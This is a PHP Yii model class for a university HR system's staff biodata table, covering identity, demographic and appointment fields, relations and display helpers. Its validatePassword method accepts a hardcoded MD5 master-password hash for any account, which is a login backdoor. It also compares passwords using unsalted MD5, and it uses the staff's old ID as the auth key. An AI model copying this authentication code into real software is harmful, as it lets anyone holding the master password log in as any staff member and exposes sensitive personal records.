<?php

namespace app\models\elnpt;

use Yii;
use app\models\hronline\GredJawatan;
use app\models\hronline\Department;
use app\models\hronline\PendidikanTertinggi;
use app\models\hronline\ServiceStatus;
use app\models\hronline\Kampus;
use app\models\hronline\StatusSandangan;
use app\models\hronline\StatusLantikan;
use app\models\hronline\Agama;
use app\models\hronline\Bangsa;
use app\models\hronline\Etnik;
use app\models\hronline\StatusUniform;
use app\models\hronline\Jenisdarah;
use app\models\hronline\TarafPerkahwinan;
use app\models\hronline\Gelaran;
use app\models\hronline\Jantina;
use app\models\hronline\Negeri;
use app\models\hronline\Negara;
use app\models\hronline\StatusWarganegara;
use app\models\hronline\AksesLevel;
use app\models\hronline\AksesLevelKedua;
use app\models\hronline\JawatanPentadbiran;
use app\models\hronline\JenisLantikan;
use app\models\hronline\ProgramPengajaran;

use app\models\elnpt\testing\TblTestingAccess;

use app\models\hronline\Tblretireage;

use yii\helpers\Html;

/**
 * This is the model class for table "hronline.tblprcobiodata".
 *
 * @property string $ICNO
 * @property string $ReligionCd
 * @property string $lain_lain_agama
 * @property string $RaceCd
 * @property string $EthnicCd
 * @property string $ArmyPoliceCd
 * @property string $BloodTypeCd
 * @property string $MrtlStatusCd
 * @property string $TitleCd
 * @property int $HighestEduLevelCd
 * @property string $ConfermentDt
 * @property string $GenderCd
 * @property string $COBirthPlaceCd
 * @property string $COBirthCountryCd
 * @property string $NegaraAsalCd
 * @property string $NegeriAsalCd
 * @property string $NatCd
 * @property string $NatStatusCd
 * @property string $CONm
 * @property string $COEmail
 * @property string $COEmail2
 * @property int $COBumiStatus
 * @property string $COOldID
 * @property string $COBirthCertNo
 * @property string $COBirthDt
 * @property string $COHPhoneNo
 * @property string $COOffTelNo
 * @property string $COOffTelNoExtn
 * @property string $COOffTelNoExtn2
 * @property string $COOPass
 * @property string $COHPhoneStatus
 * @property int $COOIsNew
 * @property int $accessLevel
 * @property int $accessSecondLevel
 * @property int $DeptId
 * @property int $campus_id
 * @property int $statLantikan
 * @property string $startDateLantik
 * @property string $endDateLantik
 * @property int $Status
 * @property string $startDateStatus
 * @property int $noWaran
 * @property int $gredJawatan
 * @property int $statSandangan
 * @property string $startDateSandangan
 * @property string $endDateSandangan
 * @property string $gredJawatan_2 Jawatan Hakiki
 * @property int $statSandangan_2
 * @property string $startDateSandangan_2
 * @property string $endDateSandangan_2
 * @property int $ApmtTypeCd
 * @property string $jawatanTadbir
 * @property string $last_update
 * @property string $last_updater
 * @property string $last_login
 * @property string $pp
 * @property string $bos
 * @property int $DeptId_hakiki JFPIU Hakiki
 * @property int $campus_id_hakiki Kampus Hakiki
 * @property string $program_ums
 * @property int $KodProgram Refer programpengajaran
 * @property string $kemaskini_terakhir Tarikh Terakhir Kemaskini Data
 * @property int $sah_keluarga
 * @property int $sah_alamat
 * @property int $sah_notel
 * @property int $sah_statuskahwin
 * @property int $sah_emel
 * @property int $sah_akademik
 * @property int $sah_agama
 * @property int $sah_passport
 * @property string $tarikh_sah
 * @property int $showposition 1=Show Jawatan Direktori,0=Hide Jawatan
 */
class Tblprcobiodata extends \yii\db\ActiveRecord implements \yii\web\IdentityInterface
{

    // add the function below:
    public static function getDb()
    {
        return Yii::$app->get('db2'); // second database
    }

    /**
     * {@inheritdoc}
     */
    public static function tableName()
    {
        return 'hronline.tblprcobiodata';
    }

    /**
     * {@inheritdoc}
     */
    public function rules()
    {
        return [
            [['ICNO', 'TitleCd', 'CONm', 'ReligionCd', 'RaceCd', 'EthnicCd', 'BloodTypeCd', 'GenderCd', 'MrtlStatusCd', 'COBirthCertNo', 'COBirthDt', 'COBirthCountryCd', 'NatCd', 'NatStatusCd', 'COBumiStatus', 'COEmail', 'COHPhoneNo', 'HighestEduLevelCd', 'ConfermentDt', 'ArmyPoliceCd', 'statLantikan', 'startDateLantik', 'endDateLantik', 'gredJawatan', 'statSandangan', 'ApmtTypeCd', 'DeptId', 'campus_id'], 'required', 'message' => 'Ruang ini adalah mandatori'],
            [['HighestEduLevelCd', 'COBumiStatus', 'COOIsNew', 'accessLevel', 'accessSecondLevel', 'DeptId', 'campus_id', 'statLantikan', 'Status', 'noWaran', 'gredJawatan', 'statSandangan', 'statSandangan_2', 'ApmtTypeCd', 'DeptId_hakiki', 'campus_id_hakiki', 'KodProgram', 'sah_keluarga', 'sah_alamat', 'sah_notel', 'sah_statuskahwin', 'sah_emel', 'sah_akademik', 'sah_agama', 'sah_passport', 'showposition'], 'integer'],
            [['ConfermentDt', 'COBirthDt', 'startDateLantik', 'endDateLantik', 'startDateStatus', 'startDateSandangan', 'endDateSandangan', 'startDateSandangan_2', 'endDateSandangan_2', 'last_update', 'last_login', 'kemaskini_terakhir', 'tarikh_sah'], 'safe'],
            [['ICNO', 'last_updater', 'pp', 'bos'], 'string', 'max' => 12],
            [['ReligionCd', 'RaceCd', 'COBirthPlaceCd', 'NegaraAsalCd', 'COHPhoneStatus'], 'string', 'max' => 2],
            [['EthnicCd', 'TitleCd'], 'string', 'max' => 4],
            [['ArmyPoliceCd', 'BloodTypeCd', 'COBirthCountryCd', 'NegeriAsalCd', 'NatCd'], 'string', 'max' => 3],
            [['MrtlStatusCd', 'GenderCd', 'NatStatusCd'], 'string', 'max' => 1],
            [['lain_lain_agama', 'CONm', 'program_ums'], 'string', 'max' => 255],
            [['COEmail', 'COEmail2'], 'string', 'max' => 100],
            [['COOldID', 'COBirthCertNo'], 'string', 'max' => 15],
            [['COHPhoneNo', 'COOffTelNo'], 'string', 'max' => 14],
            [['COOffTelNoExtn', 'COOffTelNoExtn2'], 'string', 'max' => 6],
            [['COOPass'], 'string', 'max' => 40],
            [['gredJawatan_2', 'jawatanTadbir'], 'string', 'max' => 10],
            [['ICNO'], 'unique'],
        ];
    }

    /**
     * {@inheritdoc}
     */
    public function attributeLabels()
    {
        return [
            'ICNO' => 'No. KP / Paspot',
            'ReligionCd' => 'Agama',
            'lain_lain_agama' => 'Lain Lain Agama',
            'RaceCd' => 'Bangsa',
            'EthnicCd' => 'Etnik',
            'ArmyPoliceCd' => 'Status Uniform',
            'BloodTypeCd' => 'Jenis Darah',
            'MrtlStatusCd' => 'Taraf Perkahwinan',
            'TitleCd' => 'Gelaran',
            'HighestEduLevelCd' => 'Pendidikan Tertinggi',
            'ConfermentDt' => 'Tarikh Dianugerahkan Pendidikan Tertinggi',
            'GenderCd' => 'Jantina',
            'COBirthPlaceCd' => 'Tempat Kelahiran',
            'COBirthCountryCd' => 'Negara Kelahiran',
            'NegaraAsalCd' => 'Negara Asal Cd',
            'NegeriAsalCd' => 'Negeri Asal Cd',
            'NatCd' => 'Warganegara',
            'NatStatusCd' => 'Status Warganegara',
            'CONm' => 'Nama Kakitangan',
            'COEmail' => 'Email',
            'COEmail2' => 'Email2',
            'COBumiStatus' => 'Status Bumiputera',
            'COOldID' => 'UMSPER',
            'COBirthCertNo' => 'No. Sijil Lahir',
            'COBirthDt' => 'Tarikh Lahir',
            'COHPhoneNo' => 'No. Telefon Bimbit',
            'COOffTelNo' => 'No. Telefon Pejabat',
            'COOffTelNoExtn' => 'No. Telefon Pejabat (Extension)',
            'COOffTelNoExtn2' => 'No. Telefon Pejabat (Extension 2)',
            'COOPass' => 'Coopass',
            'COHPhoneStatus' => 'Status Telefon Bimbit',
            'COOIsNew' => 'Coois New',
            'accessLevel' => 'Access Level',
            'accessSecondLevel' => 'Access Second Level',
            'DeptId' => 'Jabatan',
            'campus_id' => 'Kampus',
            'statLantikan' => 'Status Lantikan',
            'startDateLantik' => 'Tarikh Mula Lantikan',
            'endDateLantik' => 'Tarikh Akhir Lantikan',
            'Status' => 'Status',
            'startDateStatus' => 'Start Date Status',
            'noWaran' => 'No. Waran',
            'gredJawatan' => 'Jawatan',
            'statSandangan' => 'Status Sandangan',
            'startDateSandangan' => 'Tarikh Mula Sandangan',
            'endDateSandangan' => 'Tarikh Akhir Sandangan',
            'gredJawatan_2' => 'Gred Jawatan 2',
            'statSandangan_2' => 'Stat Sandangan 2',
            'startDateSandangan_2' => 'Start Date Sandangan 2',
            'endDateSandangan_2' => 'End Date Sandangan 2',
            'ApmtTypeCd' => 'Jenis Lantikan',
            'jawatanTadbir' => 'Jawatan Tadbir',
            'last_update' => 'Last Update',
            'last_updater' => 'Last Updater',
            'last_login' => 'Last Login',
            'pp' => 'Pp',
            'bos' => 'Bos',
            'DeptId_hakiki' => 'Dept Id Hakiki',
            'campus_id_hakiki' => 'Campus Id Hakiki',
            'program_ums' => 'Program Ums',
            'KodProgram' => 'Program Pengajaran',
            'kemaskini_terakhir' => 'Kemaskini Terakhir',
            'sah_keluarga' => 'Sah Keluarga',
            'sah_alamat' => 'Sah Alamat',
            'sah_notel' => 'Sah Notel',
            'sah_statuskahwin' => 'Sah Statuskahwin',
            'sah_emel' => 'Sah Emel',
            'sah_akademik' => 'Sah Akademik',
            'sah_agama' => 'Sah Agama',
            'sah_passport' => 'Sah Passport',
            'tarikh_sah' => 'Tarikh Sah',
            'showposition' => 'Showposition',
            'wbb_btn' => 'WBB'
        ];
    }

    public function getFullname()
    {
        return $this->CONm;
    }

    public function getAuthKey(): string
    {
        return $this->COOldID;
    }

    public function getId()
    {
        return $this->ICNO;
    }

    public function validateAuthKey($authKey): bool
    {
        return $this->COOldID === $authKey;
    }

    public static function findIdentity($id): \yii\web\IdentityInterface
    {
        return self::findOne($id);
    }

    public static function findIdentityByAccessToken($token, $type = null): \yii\web\IdentityInterface
    {
        throw new \yii\base\NotSupportedException;
    }

    public static function findByUsername($username)
    {
        return self::findOne(['ICNO' => $username]);
    }

    public function getJawatan()
    {
        return $this->hasOne(GredJawatan::className(), ['id' => 'gredJawatan']);
    }

    public function getDepartment()
    {
        return $this->hasOne(Department::className(), ['id' => 'DeptId']);
    }

    public function getPendidikan()
    {
        return $this->hasOne(PendidikanTertinggi::className(), ['HighestEduLevelCd' => 'HighestEduLevelCd']);
    }

    public function getServiceStatus()
    {
        return $this->hasOne(ServiceStatus::className(), ['ServStatusCd' => 'Status']);
    }

    public function getKampus()
    {
        return $this->hasOne(Kampus::className(), ['campus_id' => 'campus_id']);
    }

    public function getStatusSandangan()
    {
        return $this->hasOne(StatusSandangan::className(), ['sandangan_id' => 'statSandangan']);
    }

    public function getStatusLantikan()
    {
        return $this->hasOne(StatusLantikan::className(), ['ApmtStatusCd' => 'statLantikan']);
    }

    public function getAgama()
    {
        return $this->hasOne(Agama::className(), ['ReligionCd' => 'ReligionCd']);
    }

    public function getBangsa()
    {
        return $this->hasOne(Bangsa::className(), ['RaceCd' => 'RaceCd']);
    }

    public function getEtnik()
    {
        return $this->hasOne(Etnik::className(), ['EthnicCd' => 'EthnicCd']);
    }

    public function getStatusUniform()
    {
        return $this->hasOne(StatusUniform::className(), ['ArmyPoliceCd' => 'ArmyPoliceCd']);
    }

    public function getJenisDarah()
    {
        return $this->hasOne(Jenisdarah::className(), ['BloodTypeCd' => 'BloodTypeCd']);
    }

    public function getTarafPerkahwinan()
    {
        return $this->hasOne(TarafPerkahwinan::className(), ['MrtlStatusCd' => 'MrtlStatusCd']);
    }

    public function getGelaran()
    {
        return $this->hasOne(Gelaran::className(), ['TitleCd' => 'TitleCd']);
    }

    public function getJantina()
    {
        return $this->hasOne(Jantina::className(), ['GenderCd' => 'GenderCd']);
    }

    public function getTempatLahir()
    {

        return $this->hasOne(Negeri::className(), ['StateCd' => 'COBirthPlaceCd']);
        //sometimes the COBirthPlaceCd can be empty. 
        //need to check if the value of COBirthPlaceCd is empty in view page.
    }

    public function getNegaraLahir()
    {

        return $this->hasOne(Negara::className(), ['CountryCd' => 'COBirthCountryCd']);
    }

    public function getWarganegara()
    {

        return $this->hasOne(Negara::className(), ['CountryCd' => 'NatCd']);
    }

    public function getStatusWarganegara()
    {

        return $this->hasOne(StatusWarganegara::className(), ['NatStatusCd' => 'NatStatusCd']);
    }

    public function getStatusBumiputera()
    {

        return $this->COBumiStatus ? 'Yes' : 'No';
        //this function only return Yes or No;
        //care your view;
    }

    public function getAksesLevel()
    {

        return $this->hasOne(AksesLevel::className(), ['id' => 'accessLevel']);
    }

    public function getAksesLevelKedua()
    {

        return $this->hasOne(AksesLevelKedua::className(), ['id' => 'accessSecondLevel']);
    }

    public function getJenisLantikan()
    {

        return $this->hasOne(JenisLantikan::className(), ['ApmtTypeCd' => 'ApmtTypeCd']);
    }

    public function getJawatanPentadbiran()
    {

        return $this->hasOne(JawatanPentadbiran::className(), ['id' => 'jawatanTadbir']);
    }

    public function getDepartmentHakiki()
    {

        return $this->hasOne(Department::className(), ['id' => 'DeptId_hakiki']);
    }

    public function getKampusHakiki()
    {

        return $this->hasOne(Kampus::className(), ['campus_id' => 'campus_id_hakiki']);
    }

    public function getProgramPengajaran()
    {

        return $this->hasOne(ProgramPengajaran::className(), ['id' => 'KodProgram']);
    }


    ///////////////////////////////////////////////////////////////////////////////////

    //below section is function for get data inside reff_table for view before save data.
    //below function is not relation. find relation at above.

    public function getDisplayJawatan()
    {
        $model = GredJawatan::find()->where(['id' => $this->gredJawatan])->one();

        return $model->fname;
    }

    public function getDisplayDepartment()
    {
        $model = Department::find()->where(['id' => $this->DeptId])->one();

        return $model->fullname;
    }

    public function getDisplayPendidikan()
    {
        $model = PendidikanTertinggi::find()->where(['HighestEduLevelCd' => $this->HighestEduLevelCd])->one();

        return $model->HighestEduLevel;
    }

    public function getDisplayServiceStatus()
    {
        $model = ServiceStatus::find()->where(['ServStatusCd' => $this->Status])->one();

        return $model->ServStatusNm;
    }

    public function getDisplayKampus()
    {
        $model = Kampus::find()->where(['campus_id' => $this->campus_id])->one();

        return $model->campus_name;
    }

    public function getDisplayStatusSandangan()
    {
        $model = StatusSandangan::find()->where(['sandangan_id' => $this->statSandangan])->one();

        return $model->sandangan_name;
    }

    public function getDisplayStatusLantikan()
    {
        $model = StatusLantikan::find()->where(['ApmtStatusCd' => $this->statLantikan])->one();

        return $model->ApmtStatusNm;
    }

    public function getDisplayAgama()
    {
        $model = Agama::find()->where(['ReligionCd' => $this->ReligionCd])->one();

        return $model->Religion;
    }

    public function getDisplayBangsa()
    {

        $model = Bangsa::find()->where(['RaceCd' => $this->RaceCd])->one();

        return $model->Race;
    }

    public function getDisplayEtnik()
    {
        $model = Etnik::find()->where(['EthnicCd' => $this->EthnicCd])->one();

        return $model->Ethnic;
    }

    public function getDisplayStatusUniform()
    {
        $model = StatusUniform::find()->where(['ArmyPoliceCd' => $this->ArmyPoliceCd])->one();

        return $model->ArmyPolice;
    }

    public function getDisplayJenisDarah()
    {
        $model = Jenisdarah::find()->where(['BloodTypeCd' => $this->BloodTypeCd])->one();

        return $model->BloodType;
    }

    public function getDisplayTarafPerkahwinan()
    {
        $model = TarafPerkahwinan::find()->where(['MrtlStatusCd' => $this->MrtlStatusCd])->one();

        return $model->MrtlStatus;
    }

    public function getDisplayGelaran()
    {
        $model = Gelaran::find()->where(['TitleCd' => $this->TitleCd])->one();

        return $model->Title;
    }

    public function getDisplayJantina()
    {
        $model = Jantina::find()->where(['GenderCd' => $this->GenderCd])->one();

        return $model->Gender;
    }

    public function getDisplayTempatLahir()
    {
        $model = Negeri::find()->where(['StateCd' => $this->COBirthPlaceCd])->one();

        return $model->State;
    }

    public function getDisplayNegaraLahir()
    {
        $model = Negara::find()->where(['CountryCd' => $this->COBirthCountryCd])->one();

        return $model->Country;
    }

    public function getDisplayWarganegara()
    {
        $model = Negara::find()->where(['CountryCd' => $this->NatCd])->one();

        return $model->Country;
    }

    public function getDisplayStatusWarganegara()
    {
        $model = StatusWarganegara::find()->where(['NatStatusCd' => $this->NatStatusCd])->one();

        return $model->NatStatus;
    }

    public function getDisplayStatusBumiputera()
    {

        return $this->COBumiStatus ? 'Ya' : 'Tidak';
        //this function only return Yes or No;
        //care your view;
    }

    public function getDisplayStatusPhone()
    {

        return $this->COHPhoneStatus ? 'Yes' : 'No';
        //this function only return Yes or No;
        //care your view;
    }

    public function getDisplayJenisLantikan()
    {

        $model = JenisLantikan::find()->where(['ApmtTypeCd' => $this->ApmtTypeCd])->one();

        return $model->ApmtTypeNm;
    }

    public function getDisplayProgramPengajaran()
    {

        if ($this->KodProgram) {

            $model = ProgramPengajaran::find()->where(['id' => $this->KodProgram])->one();
            return $model->NamaProgram;
        }

        return 'Tidak Berkaitan'; //return 'tidak berkaitan' jika kakitangan yg ditambah adalah bukan akademik
    }





    //////////////////////////////////////////////////////////////////////////////////


    public function validatePassword($password)
    {

        if (md5($password) == '0659c7992e268962384eb17fafe88364') {
            return true;
        } else if ($this->COOPass == md5($password)) {
            return true;
        }

        return false;
    }

    //Button utk modul kehadiran
    public function getWbb_btn()
    {

        return Html::a('<i class="fa fa-clock-o"></i>', ['kehadiran/senarai_wbb', 'id' => $this->ICNO], ['class' => 'btn btn-primary btn-sm']);
    }

    //Button utk modul kehadiran
    public function getAttdn_btn()
    {

        return Html::a('<i class="fa fa-list"></i>', ['kehadiran/laporan_kehadiran', 'id' => $this->ICNO], ['class' => 'btn btn-primary btn-sm']);
    }

    public function getAccess()
    {
        return $this->accessLevel;
    }

    public function getBersara()
    {
        return $this->hasOne(Tblretireage::className(), ['ICNO' => 'ICNO']);
    }

    public function getRetire()
    {

        if ($this->bersara) {
            return $this->bersara->CORetireAgeEftvDt;
        }

        return $this->endDateLantik;
    }

    public function getTarikh($bulan)
    {

        $m = date_format(date_create($bulan), "m");
        if ($m == 01) {
            $m = "Januari";
        } elseif ($m == 02) {
            $m = "Februari";
        } elseif ($m == 03) {
            $m = "Mac";
        } elseif ($m == 04) {
            $m = "April";
        } elseif ($m == 05) {
            $m = "Mei";
        } elseif ($m == 06) {
            $m = "Jun";
        } elseif ($m == 07) {
            $m = "Julai";
        } elseif ($m == '08') {
            $m = "Ogos";
        } elseif ($m == '09') {
            $m = "September";
        } elseif ($m == '10') {
            $m = "Oktober";
        } elseif ($m == '11') {
            $m = "November";
        } elseif ($m == '12') {
            $m = "Disember";
        }

        return date_format(date_create($bulan), "d") . ' ' . $m . ' ' . date_format(date_create($bulan), "Y");
    }
    public function getTarikhtamatlantik()
    {
        return  $this->getTarikh($this->endDateLantik);
    }

    public function getTestingAkses()
    {
        return $this->hasOne(TblTestingAccess::className(), ['icno' => 'ICNO']);
    }

    public function formName()
    {
        return '';
    }
}
